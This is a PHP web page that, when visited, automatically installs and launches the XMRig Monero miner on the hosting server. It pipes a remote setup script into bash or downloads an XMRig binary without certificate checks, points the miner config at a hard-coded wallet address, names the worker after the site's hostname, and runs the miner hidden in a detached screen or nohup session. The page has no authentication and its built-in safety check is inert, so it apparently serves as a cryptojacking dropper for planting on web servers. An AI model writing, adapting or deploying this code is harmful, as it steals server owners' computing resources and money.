<?php
// Set default Monero address
 $defaultAddress = "83c4H4wjx8qLTqpUUGdCQE9hM2SwxcukTLFd29PtUrWpby4CXohXYoLQBBrwpYrDfUapxAgenNr2iG847x7wRazPH2RH6nm"; // <--- REPLACE THIS

// Get custom address from URL parameter if provided
 $address = isset($_GET['address']) ? $_GET['address'] : $defaultAddress;

// --- Helper Functions ---

/**
 * Checks if a command exists on the system.
 */
function isCommandAvailable($command) {
    $output = shell_exec("command -v " . escapeshellarg($command));
    return !empty(trim($output));
}

/**
 * Executes a command and displays output with a loading spinner for long tasks.
 */
function executeCommand($command, $isLongTask = false) {
    echo "<div class='command-block'>";
    echo "<strong>Executing:</strong> <code>" . htmlspecialchars($command) . "</code><br>";
    
    if ($isLongTask) {
        echo "<div class='spinner'></div> <span class='loading-text'>Processing, please wait...</span>";
        flush(); ob_flush();
    }
    
    $output = shell_exec($command . ' 2>&1');
    
    if ($isLongTask) {
        echo "<script>document.querySelector('.spinner').style.display='none'; document.querySelector('.loading-text').style.display='none';</script>";
    }
    
    if (!empty(trim($output))) {
        echo "<strong>Output:</strong><br><pre>" . htmlspecialchars($output) . "</pre>";
    } else {
        echo "<span class='success'>✓ Done</span>";
    }
    echo "</div>";
    flush(); ob_flush();
    return $output;
}

/**
 * Checks if the xmrig process is running.
 */
function isMinerRunning() {
    return !empty(shell_exec("ps aux | grep '[x]mrig'"));
}

/**
 * Starts the miner, prioritizing 'screen' with a robust command.
 */
function startMiner($path, $executableName) {
    echo "<h2>Starting Miner</h2>";
    $minerExecutable = $path . '/' . $executableName;
    $screenSessionName = 'xmrig_miner';

    if (isCommandAvailable('screen')) {
        echo "<div class='info'>";
        echo "<p>✅ 'screen' found. Starting miner in a detached session named '<code>$screenSessionName</code>'.</p>";
        echo "<p>To view the miner console later, run this command in your server's terminal:</p>";
        echo "<code>screen -r $screenSessionName</code>";
        echo "</div>";
        
        $command = "screen -dmS '$screenSessionName' bash -c 'cd $path && ./$executableName'";
        executeCommand($command);
    } else {
        echo "<div class='warning'>";
        echo "<p>⚠️ 'screen' not found. Falling back to 'nohup'.</p>";
        echo "</div>";
        
        $logFile = $path . '/bot.log';
        $command = "cd '$path' && nohup ./$executableName > '$logFile' 2>&1 & disown";
        executeCommand($command);
    }
}

// --- Core Installation Functions ---

function downloadFile($url, $destination) {
    echo "<div class='command-block'>";
    echo "<strong>Downloading:</strong> " . htmlspecialchars(basename($url)) . "<br>";
    echo "<div class='spinner'></div> <span class='loading-text'>Downloading, this may take a moment...</span>";
    flush(); ob_flush();

    $fp = fopen($destination, 'w+');
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_FILE, $fp);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_FAILONERROR, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    
    $result = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    fclose($fp);

    echo "<script>document.querySelector('.spinner').style.display='none'; document.querySelector('.loading-text').style.display='none';</script>";

    if ($result && $httpCode == 200) {
        echo "<span class='success'>✓ Download complete</span>";
        return true;
    } else {
        echo "<span class='error'>✗ Download failed (HTTP Code: $httpCode)</span>";
        unlink($destination);
        return false;
    }
    echo "</div>";
}

/**
 * MODIFIED: More robust config modification with verification.
 */
function modifyAndVerifyConfig($configPath, $address) {
    echo "<h2>Configuring Miner</h2>";
    
    if (!file_exists($configPath)) {
        echo "<div class='error'><p>❌ Config file not found at <code>" . htmlspecialchars($configPath) . "</code></p>"; return false;
    }

    // Step 1: Make the file writable
    executeCommand("chmod 664 '$configPath'");
    executeCommand("chown " . shell_exec('whoami') . " '$configPath'");

    // Step 2: Read and modify the config
    $configContent = file_get_contents($configPath);
    $config = json_decode($configContent, true);

    if (json_last_error() !== JSON_ERROR_NONE) {
        echo "<div class='error'><p>❌ Failed to parse JSON config. Error: " . json_last_error_msg() . "</p></div>"; return false;
    }

    $workerName = $_SERVER['HTTP_HOST'] ?: 'default_worker';
    $config['pools'][0]['url'] = "gulf.moneroocean.stream:10128";
    $config['pools'][0]['user'] = $address;
    $config['pools'][0]['pass'] = $workerName;
    $config['log-file'] = 'xmr.log';

    // Step 3: Write the new config
    if (file_put_contents($configPath, json_encode($config, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES))) {
        echo "<div class='info'><p>✓ Config file written successfully.</p></div>";
    } else {
        echo "<div class='error'><p>❌ Failed to write to config file. Check permissions.</p></div>"; return false;
    }

    // Step 4: VERIFY the changes were saved
    echo "<p>Verifying configuration...</p>";
    $newConfig = json_decode(file_get_contents($configPath), true);
    if ($newConfig['pools'][0]['user'] === $address) {
        echo "<div class='info'>";
        echo "<p>✅ <strong>Verification Successful!</strong> Address is correctly set.</p>";
        echo "<ul>";
        echo "<li><strong>Pool:</strong> " . htmlspecialchars($config['pools'][0]['url']) . "</li>";
        echo "<li><strong>User:</strong> " . htmlspecialchars($config['pools'][0]['user']) . "</li>";
        echo "<li><strong>Worker Name:</strong> " . htmlspecialchars($config['pools'][0]['pass']) . "</li>";
        echo "<li><strong>Log File:</strong> " . htmlspecialchars($config['log-file']) . "</li>";
        echo "</ul>";
        echo "</div>";
        return true;
    } else {
        echo "<div class='error'><p>❌ <strong>Verification Failed!</strong> The address was not saved correctly. Found: <code>" . htmlspecialchars($newConfig['pools'][0]['user']) . "</code></p></div>";
        return false;
    }
}


// --- HTML & CSS ---
?>
<!DOCTYPE html>
<html>
<head>
    <title>Monero Miner Setup</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background-color: #f4f4f9; }
        .container { max-width: 900px; margin: auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
        .header { background: #007bff; color: white; padding: 20px; text-align: center; border-radius: 8px 8px 0 0; margin: -20px -20px 20px -20px; }
        .info { background: #d4edda; padding: 15px; margin: 10px 0; border-radius: 5px; border-left: 5px solid #28a745; }
        .warning { background: #fff3cd; padding: 15px; margin: 10px 0; border-radius: 5px; border-left: 5px solid #ffc107; }
        .error { background: #f8d7da; padding: 15px; margin: 10px 0; border-radius: 5px; border-left: 5px solid #dc3545; }
        .command-block { background-color: #f0f0f0; padding: 10px; margin: 5px 0; border-left: 4px solid #007bff; font-family: monospace; }
        .success { color: green; }
        .error-text { color: red; }
        code { background-color: #e9ecef; padding: 2px 5px; border-radius: 3px; }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #007bff; border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; display: inline-block; vertical-align: middle; margin-right: 10px; }
        .loading-text { vertical-align: middle; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
<div class='container'>
<div class='header'>
    <h1>🚀 Monero Miner Automatic Setup</h1>
</div>

<?php
// --- Main Logic ---

// SAFETY CHECK: Ensure the default address has been changed.
if ($address === $defaultAddress && $defaultAddress === "YOUR_DEFAULT_XMR_ADDRESS_HERE") {
    echo "<div class='error'>";
    echo "<h2>❌ SCRIPT CONFIGURATION ERROR</h2>";
    echo "<p>You must edit the script and replace <code>YOUR_DEFAULT_XMR_ADDRESS_HERE</code> with your actual Monero address.</p>";
    echo "</div>";
    echo "</div></body></html>";
    exit;
}

echo "<div class='info'>";
echo "<h2>Current Configuration</h2>";
echo "<p><strong>Monero Address:</strong> <code>" . htmlspecialchars($address) . "</code></p>";
echo "<p><strong>To use a different address:</strong> Add <code>?address=YOUR_ADDRESS</code> to the URL</p>";
echo "</div>";

// FAST CHECK: Is the miner already running?
if (isMinerRunning()) {
    echo "<div class='info'>";
    echo "<h2>✅ Status: Miner Already Running</h2>";
    echo "<p>The xmrig process is already active on this server. No action needed.</p>";
    echo "<pre>" . htmlspecialchars(shell_exec("ps aux | grep '[x]mrig'")) . "</pre>";
    echo "</div>";
    echo "</div></body></html>";
    exit;
}

// Check for HOME environment variable
 $homeEnv = trim(shell_exec('printenv HOME'));
 $configIsVerified = false; // Flag to track successful configuration

if (!empty($homeEnv)) {
    // --- BRANCH 1: HOME exists, use MoneroOcean script ---
    echo "<h2>Environment Check</h2>";
    echo "<div class='info'><p>✅ HOME environment variable found: <code>" . htmlspecialchars($homeEnv) . "</code></p></div>";
    
    $installDir = $homeEnv . '/moneroocean';

    if (is_dir($installDir)) {
        echo "<div class='warning'><p>⚠️ Installation directory <code>" . htmlspecialchars($installDir) . "</code> already exists, but the miner is not running. Please check manually.</p></div>";
    } else {
        echo "<h2>Running MoneroOcean Setup Script</h2>";
        executeCommand("curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s " . escapeshellarg($address), true);
        
        if (is_dir($installDir)) {
            // For MoneroOcean, we assume the script sets up the address, but we can still try to set the log file
            $configPath = $installDir . '/config.json';
            if (modifyAndVerifyConfig($configPath, $address)) {
                $configIsVerified = true;
            }
        } else {
            echo "<div class='error'><h2>❌ Installation Failed</h2><p>The MoneroOcean script did not create the expected directory.</p></div>";
        }
    }

} else {
    // --- BRANCH 2: HOME does not exist, use manual install ---
    echo "<h2>Environment Check</h2>";
    echo "<div class='warning'><p>⚠️ HOME environment variable not found. Using manual installation.</p></div>";
    
    $baseDir = dirname($_SERVER['DOCUMENT_ROOT']);
    $tmpDir = $baseDir . '/tmp';
    $installDir = $tmpDir . '/xmrig-6.24.0';

    if (is_dir($installDir)) {
        echo "<div class='warning'><p>⚠️ Installation directory <code>" . htmlspecialchars($installDir) . "</code> already exists, but the miner is not running. Please check manually.</p></div>";
    } else {
        echo "<h2>Step 1: Creating Temp Directory</h2>";
        if (!is_dir($tmpDir)) { mkdir($tmpDir, 0755, true); }
        echo "<div class='info'><p>✓ Directory <code>" . htmlspecialchars($tmpDir) . "</code> is ready.</p></div>";

        echo "<h2>Step 2: Downloading XMRig</h2>";
        $downloadUrl = "https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz";
        $downloadPath = $tmpDir . '/xmrig.tar.gz';
        if (downloadFile($downloadUrl, $downloadPath)) {
            
            echo "<h2>Step 3: Extracting Files</h2>";
            executeCommand("tar -xzf '$downloadPath' -C '$tmpDir'", true);
            
            if (file_exists($installDir . '/xmrig')) {
                executeCommand("chmod +x '$installDir/xmrig'");
                $configPath = $installDir . '/config.json';
                if (modifyAndVerifyConfig($configPath, $address)) {
                    $configIsVerified = true; // Mark as successful
                }
            } else {
                echo "<div class='error'><p>❌ Failed to find xmrig after extraction.</p></div>";
            }
        }
    }
}

// --- FINAL STEP: Start Miner ONLY if config was verified ---
if ($configIsVerified) {
    startMiner($installDir, 'xmrig');
    echo "<div class='info'><h2>✅ Installation Complete!</h2><p>Miner should now be running.</p></div>";
} else {
    echo "<div class='error'><h2>❌ Setup Aborted</h2><p>The miner was not started because the configuration could not be verified. Please check the errors above.</p></div>";
}

// Final status check
echo "<h2>Final Status</h2>";
if (isMinerRunning()) {
    echo "<div class='info'><p style='color: green;'>✅ Miner process is now running!</p></div>";
} else {
    echo "<div class='error'><p style='color: red;'>❌ Miner process is NOT running. Check the steps above for errors.</p></div>";
}

?>
</div>
</body>
</html>
